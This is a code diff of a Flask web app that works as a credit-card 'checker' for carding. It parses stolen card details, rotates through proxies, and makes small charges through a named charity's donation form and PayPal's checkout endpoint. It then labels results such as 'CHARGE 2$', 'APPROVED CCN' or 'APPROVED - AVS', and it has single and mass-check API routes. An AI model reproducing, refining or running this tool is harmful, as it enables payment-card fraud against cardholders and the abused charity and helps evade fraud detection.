@@ -1,4 +1,4 @@
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, render_template, request, jsonify
 import requests
 import re
 import time
@@ -6,35 +6,17 @@ import random
 import threading
 import queue
 from datetime import datetime
+import os
 
 app = Flask(__name__)
 
-# Função para ler o arquivo HTML
-def get_html():
-    try:
-        with open('index.html', 'r', encoding='utf-8') as f:
-            return f.read()
-    except FileNotFoundError:
-        return """
-        <!DOCTYPE html>
-        <html>
-        <head><title>Erro</title></head>
-        <body>
-            <h1>Arquivo index.html não encontrado</h1>
-            <p>Certifique-se que o arquivo index.html está na mesma pasta que o app.py</p>
-        </body>
-        </html>
-        """
-
-@app.route('/')
-def index():
-    return render_template_string(get_html())
-
-# ==================== LISTAS E CONFIGURAÇÕES ====================
+# ==================== SEU CÓDIGO ORIGINAL DO BOT ====================
 
 nomes = ["Liam", "Noah", "Oliver", "Elijah", "James", "William", "Benjamin", "Lucas", "Henry", 
          "Alexander", "Michael", "Daniel", "Matthew", "Joseph", "David", "Samuel", "John", "Ethan",
-         "Jacob", "Logan", "Jackson", "Sebastian", "Jack", "Aiden", "Owen", "Leo", "Wyatt", "Jayden"]
+         "Jacob", "Logan", "Jackson", "Sebastian", "Jack", "Aiden", "Owen", "Leo", "Wyatt", "Jayden",
+         "Gabriel", "Carter", "Luke", "Grayson", "Isaac", "Lincoln", "Mason", "Theodore", "Ryan",
+         "Nathan", "Andrew", "Joshua", "Thomas", "Charles", "Caleb", "Christian", "Hunter", "Jonathan"]
 
 apelidos = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez",
             "Wilson", "Martinez", "Anderson", "Taylor", "Thomas", "Hernandez", "Moore", "Martin", "Thompson",
@@ -48,30 +30,19 @@ proxy_lock = threading.Lock()
 request_counter = 0
 request_lock = threading.Lock()
 
-# ==================== FUNÇÕES DE PROXY ====================
-
 def parse_proxy(proxy_string):
-    """Parse diferentes formatos de proxy HTTP"""
     proxy_string = proxy_string.strip()
-    
     if proxy_string.startswith('http://'):
         return proxy_string
-    
     if '@' in proxy_string and ':' in proxy_string.split('@')[0]:
         return f'http://{proxy_string}'
-    
     if ':' in proxy_string and not '@' in proxy_string:
         parts = proxy_string.split(':')
         if len(parts) == 2:
             return f'http://{proxy_string}'
-    
-    if proxy_string.startswith('http://') and '@' not in proxy_string:
-        return proxy_string
-    
     return None
 
 def test_proxy(proxy_url):
-    """Testa se um proxy está funcionando"""
     try:
         proxies = {'http': proxy_url, 'https': proxy_url}
         response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
@@ -80,31 +51,24 @@ def test_proxy(proxy_url):
         return False
 
 def get_next_proxy():
-    """Retorna o próximo proxy da lista"""
     global current_proxy_index, request_counter
-    
     with proxy_lock:
         if not proxies_list:
             return None
-        
         with request_lock:
             request_counter += 1
             if request_counter >= 5:
                 request_counter = 0
                 current_proxy_index = (current_proxy_index + 1) % len(proxies_list)
-        
         proxy = proxies_list[current_proxy_index]
         return {'http': proxy, 'https': proxy}
 
 def get_session_with_proxy():
-    """Cria uma sessão com proxy configurado"""
     session = requests.Session()
     proxy = get_next_proxy()
     if proxy:
         session.proxies.update(proxy)
     return session
-
-# ==================== FUNÇÕES DO CHECKER ====================
 
 def get_bin_info(bin_number):
     try:
@@ -122,18 +86,19 @@ def format_year(yy):
         return yy
     return yy
 
-def check_card(card_details):
-    """Função principal de verificação de cartão"""
-    card_details = card_details.strip()
-    parts = card_details.split("|")
+def reg(card_details):
+    pattern = r'(\d{16}\|\d{1,2}\|\d{2,4}\|\d{3})'
+    match = re.search(pattern, card_details)
+    if match:
+        return match.group(1)
+    return 'None'
+
+def brn6(ccx):
+    ccx = ccx.strip()
+    parts = ccx.split("|")
     
     if len(parts) != 4:
-        return {
-            'status': 'DECLINED ❌',
-            'response': 'Invalid format',
-            'card': card_details,
-            'message': 'Use formato: NUMERO|MM|AA|CVV'
-        }
+        return f"DECLINED ❌|Invalid card format"
     
     cc = parts[0]
     mm = parts[1]
@@ -159,19 +124,14 @@ def check_card(card_details):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
         }
         
-        session.get('https://solefamily.org/donate/', cookies=session.cookies, headers=headers)
+        response = session.get('https://solefamily.org/donate/', cookies=session.cookies, headers=headers)
         
         params = {'giveDonationFormInIframe': '1'}
         res = session.get('https://solefamily.org/give/23178', params=params, cookies=session.cookies, headers=headers).text
         
         hash_match = re.search('form-hash" value="(.*?)"', res)
         if not hash_match:
-            return {
-                'status': 'DECLINED ❌',
-                'response': 'Hash extraction failed',
-                'card': card_details,
-                'message': 'Could not extract form hash'
-            }
+            return f"DECLINED ❌|Hash extraction failed"
         hash1 = hash_match.group(1)
         
         files = {
@@ -209,12 +169,7 @@ def check_card(card_details):
         
         response_json = response.json()
         if 'data' not in response_json or 'id' not in response_json['data']:
-            return {
-                'status': 'DECLINED ❌',
-                'response': 'Order creation failed',
-                'card': card_details,
-                'message': 'Could not create order'
-            }
+            return f"DECLINED ❌|Order creation failed"
         
         id_value = response_json['data']['id']
         time.sleep(3)
@@ -260,138 +215,60 @@ def check_card(card_details):
         response = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', cookies=session.cookies, headers=headers, json=json_data)
         last = response.text
         
-        bin_info = get_bin_info(cc[:6])
-        
-        result = {
-            'card': card_details,
-            'bin_info': bin_info,
-            'time': datetime.now().strftime("%H:%M:%S")
-        }
-        
         if ('ADD_SHIPPING_ERROR' in last or 'NEED_CREDIT_CARD' in last or '"status": "succeeded"' in last or 
             'Thank You For Donation.' in last or 'Your payment has already been processed' in last or 'Success ' in last):
-            result['status'] = 'APPROVED ✅'
-            result['response'] = 'Charged successfully'
-            result['message'] = 'CHARGE 2$ ✅|Charged successfully'
+            return 'CHARGE 2$ ✅|Charged successfully'
         elif 'is3DSecureRequired' in last or 'OTP' in last:
-            result['status'] = '3DS REQUIRED ⚠️'
-            result['response'] = '3DS Verification Required'
-            result['message'] = 'Approve ❎|3DS Required'
+            return 'Approve ❎|3DS Required'
         elif 'INVALID_SECURITY_CODE' in last:
-            result['status'] = 'APPROVED ✅'
-            result['response'] = 'Invalid Security Code'
-            result['message'] = 'APPROVED CCN ✅|INVALID_SECURITY_CODE'
+            return 'APPROVED CCN ✅|INVALID_SECURITY_CODE'
         elif 'INVALID_BILLING_ADDRESS' in last:
-            result['status'] = 'APPROVED ✅'
-            result['response'] = 'Invalid Billing Address'
-            result['message'] = 'APPROVED - AVS ✅|INVALID_BILLING_ADDRESS'
+            return 'APPROVED - AVS ✅|INVALID_BILLING_ADDRESS'
         elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
-            result['status'] = 'APPROVED ✅'
-            result['response'] = 'Account Restricted'
-            result['message'] = 'APPROVED ✅|EXISTING_ACCOUNT_RESTRICTED'
+            return 'APPROVED ✅|EXISTING_ACCOUNT_RESTRICTED'
         else:
-            result['status'] = 'DECLINED ❌'
-            result['response'] = 'Transaction Declined'
-            result['message'] = f'DECLINED ❌|{response.text[:100] if hasattr(response, "text") else "Unknown error"}'
-        
-        return result
-        
+            try:
+                response_json = response.json()
+                if 'errors' in response_json and len(response_json['errors']) > 0:
+                    message = response_json['errors'][0].get('message', 'Unknown error')
+                    return f'DECLINED ❌|{message}'
+                return f'DECLINED ❌|{response.text[:100]}'
+            except:
+                return f'DECLINED ❌|{response.text[:100]}'
+                
     except Exception as e:
-        return {
-            'status': 'ERROR ❌',
-            'response': str(e),
-            'card': card_details,
-            'message': f'ERROR ❌|{str(e)}'
-        }
+        return f"DECLINED ❌|{str(e)}"
 
 # ==================== ROTAS DA API ====================
 
-@app.route('/api/add_proxies', methods=['POST'])
-def api_add_proxies():
-    global proxies_list
-    data = request.json
-    proxy_text = data.get('proxies', '')
-    lines = proxy_text.strip().split('\n')
-    
-    added = 0
-    invalid = 0
-    
-    for line in lines:
-        parsed = parse_proxy(line)
-        if parsed:
-            proxies_list.append(parsed)
-            added += 1
-        else:
-            invalid += 1
-    
-    return jsonify({
-        'success': True,
-        'added': added,
-        'invalid': invalid,
-        'total': len(proxies_list)
-    })
-
-@app.route('/api/test_proxies', methods=['POST'])
-def api_test_proxies():
-    global proxies_list
-    
-    if not proxies_list:
-        return jsonify({'success': False, 'error': 'No proxies to test'})
-    
-    working_proxies = []
-    failed_proxies = []
-    
-    for proxy in proxies_list:
-        if test_proxy(proxy):
-            working_proxies.append(proxy)
-        else:
-            failed_proxies.append(proxy)
-    
-    proxies_list = working_proxies
-    
-    return jsonify({
-        'success': True,
-        'working': len(working_proxies),
-        'failed': len(failed_proxies),
-        'total': len(working_proxies) + len(failed_proxies)
-    })
-
-@app.route('/api/view_proxies', methods=['GET'])
-def api_view_proxies():
-    return jsonify({
-        'total': len(proxies_list),
-        'proxies': proxies_list[:20]
-    })
-
-@app.route('/api/delete_proxies', methods=['POST'])
-def api_delete_proxies():
-    global proxies_list, current_proxy_index, request_counter
-    count = len(proxies_list)
-    proxies_list = []
-    current_proxy_index = 0
-    request_counter = 0
-    
-    return jsonify({
-        'success': True,
-        'deleted': count
-    })
+@app.route('/')
+def index():
+    return render_template('index.html')
 
 @app.route('/api/check_single', methods=['POST'])
 def api_check_single():
     data = request.json
     card = data.get('card', '')
     
-    pattern = r'\d{16}\|\d{1,2}\|\d{2,4}\|\d{3}'
-    if not re.match(pattern, card):
-        return jsonify({
-            'success': False,
-            'error': 'Invalid card format. Use: 4111111111111111|12|2026|123'
-        })
+    result = brn6(card)
     
-    result = check_card(card)
+    if "|" in result:
+        status, response_msg = result.split("|", 1)
+    else:
+        status = result
+        response_msg = result
+    
+    bin_info = get_bin_info(card[:6] if len(card) > 6 else card)
+    
     return jsonify({
         'success': True,
-        'result': result
+        'result': {
+            'status': status,
+            'response': response_msg,
+            'card': card,
+            'bin_info': bin_info,
+            'time': datetime.now().strftime("%H:%M:%S")
+        }
     })
 
 @app.route('/api/check_mass', methods=['POST'])
@@ -403,55 +280,93 @@ def api_check_mass():
     cards = re.findall(pattern, cards_text)
     
     if not cards:
-        return jsonify({
-            'success': False,
-            'error': 'No valid cards found'
-        })
+        return jsonify({'success': False, 'error': 'No valid cards found'})
     
     results = []
-    approved = []
-    declined = []
+    approved_count = 0
+    declined_count = 0
     
     for card in cards:
-        result = check_card(card)
-        results.append(result)
-        if 'APPROVED' in result.get('status', ''):
-            approved.append(result)
+        result = brn6(card)
+        
+        if "|" in result:
+            status, response_msg = result.split("|", 1)
         else:
-            declined.append(result)
-        time.sleep(0.5)  # Pequeno delay entre verificações
+            status = result
+            response_msg = result
+        
+        if '✅' in status or 'Approve' in status:
+            approved_count += 1
+        else:
+            declined_count += 1
+        
+        bin_info = get_bin_info(card[:6])
+        
+        results.append({
+            'status': status,
+            'response': response_msg,
+            'card': card,
+            'bin_info': bin_info,
+            'time': datetime.now().strftime("%H:%M:%S")
+        })
+        
+        time.sleep(0.5)
     
     return jsonify({
         'success': True,
         'total': len(cards),
-        'approved_count': len(approved),
-        'declined_count': len(declined),
-        'approved': approved,
-        'declined': declined,
+        'approved_count': approved_count,
+        'declined_count': declined_count,
         'all_results': results
     })
+
+@app.route('/api/add_proxies', methods=['POST'])
+def api_add_proxies():
+    global proxies_list
+    data = request.json
+    proxy_text = data.get('proxies', '')
+    lines = proxy_text.strip().split('\n')
+    
+    added = 0
+    for line in lines:
+        parsed = parse_proxy(line)
+        if parsed:
+            proxies_list.append(parsed)
+            added += 1
+    
+    return jsonify({'success': True, 'added': added, 'total': len(proxies_list)})
+
+@app.route('/api/test_proxies', methods=['POST'])
+def api_test_proxies():
+    global proxies_list
+    working = []
+    for proxy in proxies_list:
+        if test_proxy(proxy):
+            working.append(proxy)
+    proxies_list = working
+    return jsonify({'success': True, 'working': len(working), 'total': len(proxies_list)})
+
+@app.route('/api/view_proxies', methods=['GET'])
+def api_view_proxies():
+    return jsonify({'total': len(proxies_list), 'proxies': proxies_list[:20]})
+
+@app.route('/api/delete_proxies', methods=['POST'])
+def api_delete_proxies():
+    global proxies_list
+    proxies_list = []
+    return jsonify({'success': True, 'deleted': True})
 
 @app.route('/api/get_status', methods=['GET'])
 def api_get_status():
     return jsonify({
-        'threads': max_threads,
-        'proxies_count': len(proxies_list),
-        'status': 'Online'
+        'status': 'Online',
+        'proxies': len(proxies_list)
     })
 
-# ==================== MAIN ====================
 if __name__ == '__main__':
-    # Pega a porta do ambiente (Render define automaticamente)
     port = int(os.environ.get('PORT', 5000))
-    
     print("=" * 50)
-    print("🚀 CHECKER WEB INICIADO COM SUCESSO!")
+    print("🚀 CHECKER WEB RODANDO")
+    print(f"📍 Acesse: http://localhost:{port}")
     print("=" * 50)
-    print(f"📍 Acesse no navegador: http://localhost:{port}")
-    print(f"⚙️ Threads configuradas: {max_threads}")
-    print("=" * 50)
-    
-    # Importar os no topo do arquivo
-    import os
-    
-    app.run(debug=False, host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port, debug=False)
